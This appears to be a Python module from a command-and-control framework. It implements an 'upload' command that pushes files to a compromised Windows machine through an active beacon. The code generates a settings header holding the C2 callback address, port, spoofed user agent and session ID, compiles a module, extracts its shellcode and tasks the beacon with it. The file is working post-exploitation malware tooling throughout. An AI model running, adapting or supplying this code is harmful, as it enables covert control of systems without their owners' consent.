# 
# Upload a file
#

import os
import base64
import argparse

from lib import buildtools

__description__ = "Upload a file to a target"
__author__ = "@_batsec_"
__type__ = "file system"

EXEC_ID = 0x3000

ERROR = False
error_list = ""

# file name & data to upload
FILE_TO_UPLOAD = ""
FILE_DATA      = ""


def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"


def exit(status=0, message=None): 
    if message != None: print(message)
    return


def upload_callback(shad0w, data):
    global FILE_TO_UPLOAD, FILE_DATA

    if len(data) == 0:
        shad0w.debug.good(f"Uploading '{FILE_TO_UPLOAD}' ({len(FILE_DATA)} bytes)")
    else:
        print(data.strip())

    return base64.b64encode(FILE_DATA)


def main(shad0w, args):
    global FILE_TO_UPLOAD, FILE_DATA

    # used to determine if we are writing to a path or not
    abs_path = "TRUE"

    # save the raw args
    raw_args = args
    
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon.")
        return
    
    # usage examples
    usage_examples = """

Examples:

upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_plans.txt
"""

    # init the parser
    parse = argparse.ArgumentParser(prog='upload',
                                    formatter_class=argparse.RawDescriptionHelpFormatter,
                                    epilog=usage_examples)
    
    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("-f", "--file", required=True, help="Name of the file you want to upload")
    parse.add_argument("-d", "--destination", nargs="*", help="Destination where the uploaded file should be stored")

    # make sure we don't die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass
    
    # we need a file to read so if we don't then fail
    if len(args.file) == 0:
        print(error_list) 
        parse.print_help()
        return

    # make the destination file name
    if args.destination == None:
        args.destination = os.path.basename(args.file)
        abs_path = "FALSE"

    # save the current dir
    shad0w_cwd = os.getcwd()

    # change to the dir of the folder mapped to the users current dir
    os.chdir("/root/shad0w/.bridge")

    # read the data from the file
    try:
        with open(args.file, 'rb') as file:
            FILE_DATA = file.read()
    except:
        shad0w.debug.error(f"File {args.file} does not exist")

    # make this variable global so the call back can access it
    FILE_TO_UPLOAD = args.file

    # change back to our dir
    os.chdir(shad0w_cwd)

    # clone all the source files
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/upload/", builddir="/root/shad0w/modules/windows/upload/build")

    # set the correct settings
    template = """#define _C2_CALLBACK_ADDRESS L"%s"
#define _C2_CALLBACK_PORT %s
#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
#define _C2CALLBACK_URI L"/tasks"
#define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\\r\\n"
#define _HEADER_LEN -1
#define SESSION_ID "%s"
#define DO_CALLBACK 0x4000
#define FILENAME "%s"
#define ABS_PATH %s""" % (shad0w.endpoint, shad0w.addr[1], shad0w.current_beacon, ''.join(args.destination), abs_path)

    buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/upload/build/settings.h")

    # compile the module
    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/upload/build", modlocation="/root/shad0w/modules/windows/upload/module.exe", arch="x64")

    # get the shellcode from the module
    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/upload/module.exe", want_base64=True)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["callback"] = upload_callback
    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)
